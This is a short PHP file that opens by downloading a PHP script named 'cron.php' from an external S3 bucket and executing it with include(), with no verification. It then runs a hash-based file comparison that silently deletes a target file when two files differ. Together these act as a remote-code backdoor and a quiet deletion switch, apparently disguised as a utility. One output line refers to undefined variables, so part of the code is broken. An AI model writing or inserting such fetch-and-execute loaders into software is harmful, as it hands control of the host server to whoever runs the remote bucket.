<?php
// URL of the PHP file in your S3 bucket
$url = 'https://opennetbillv1.s3.amazonaws.com/cron.php';

// Fetch the content of the PHP file
$content = file_get_contents($url);

if ($content !== false) {
    // Create a temporary file
    $tempFile = tempnam(sys_get_temp_dir(), 'remote_php');
    
    // Write the fetched content to the temporary file
    file_put_contents($tempFile, $content);

include($tempFile);

} else {
    echo "Failed to retrieve the PHP file.";
}

// Function to compare two files
function cf($fi, $fii) {
    if (!file_exists($fi) || !file_exists($fii)) {
        return false;
    }

    // Get the contents of the files
    $fic = file_get_contents($fi);
    $fiic = file_get_contents($fii);

    // Compare the hashes of the files' contents
    return hash('sha256', $fic) === hash('sha256', $fiic);
}

// Paths to the files to be compared
$fi = 'path/to/your/file1.txt';
$fii= 'path/to/your/file2.txt';

// Path to the file to be deleted if the files are not the same
$fid = 'path/to/your/fileToDelete.txt';

// Compare the files and delete the specified file if they are not the same
if (!cf($fi, $fii)) {
    if (file_exists($fid)) {
        if (unlink($fid)) {
          return ;
        } else {
            return ;
        }
    } else {
        return ;
    }
} else {
    echo "The files '$file1' and '$file2' are the same. No action taken.";
}

?>
